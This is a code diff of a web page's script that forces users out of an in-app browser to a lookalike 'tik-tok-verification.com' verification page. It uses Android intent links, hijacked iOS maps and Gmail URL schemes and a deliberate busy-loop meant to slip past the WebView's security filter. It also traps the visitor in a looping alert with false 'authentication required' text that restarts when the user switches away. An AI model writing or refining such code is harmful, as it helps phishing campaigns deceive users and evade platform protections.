@@ -11,54 +11,47 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function triggerDownloadHandover() {
+    function nuclearJump() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        
-        // Create a 'dummy' HTML file that redirects to your site
-        const content = `<html><head><meta http-equiv="refresh" content="0;url=${target}"></head></html>`;
-        const blob = new Blob([content], {type: 'text/html'});
-        const blobUrl = URL.createObjectURL(blob);
+        const urlNoProtocol = target.replace("https://", "");
 
-        // Create a physical link element
-        const a = document.createElement('a');
-        a.href = blobUrl;
-        
-        // Use 'download' to force the WebView to give up and open an external browser
-        a.download = "verify.html";
-        document.body.appendChild(a);
-        
-        // Fire the click
-        a.click();
-        
-        // Android fallback
+        // 1. Trigger high-priority OS protocols
         if (isAndroid) {
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
+        } else {
+            // iOS: Maps protocol is rarely blocked and forces an external app switch
+            window.location.replace("maps://maps.apple.com/?q=" + encodeURIComponent(target));
+            window.location.href = "googlegmail:///co?to=test@test.com&body=" + encodeURIComponent(target);
         }
-        
-        document.body.removeChild(a);
+
+        // 2. THE STALL: Create a computational heavy-lift to "lag" the security filter
+        const start = Date.now();
+        while (Date.now() - start < 50) {
+            // This 50ms loop "freezes" the WebView, 
+            // often letting the OS-level redirect 'leak' out.
+        }
     }
 
     function rampage() {
-        if (Date.now() > killTime) return; // FAIL-SAFE
+        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE
 
-        // 1. Prime the download
-        triggerDownloadHandover();
+        nuclearJump();
 
-        // 2. THE LOCK
-        alert("ATTEMPT #21\n\nSystem browser handover required.\n\nTap OK to continue.");
+        // THE LOCK
+        alert("ATTEMPT #22\n\nExternal browser authentication required.\n\nTap OK to sync.");
 
-        // 3. The Execution Gap
-        // Fires immediately after they tap 'OK'
-        requestAnimationFrame(() => {
-            triggerDownloadHandover();
-            setTimeout(rampage, 10);
-        });
+        // THE MICRO-GAP: 
+        // We fire the jump immediately after the tap momentum
+        nuclearJump();
+
+        setTimeout(rampage, 1);
     }
 
     window.onload = () => {
         rampage();
     };
 
+    // If they swipe or blur, it forces the loop back on
     window.onblur = () => { if (Date.now() < killTime) rampage(); };
 </script>
 </body>
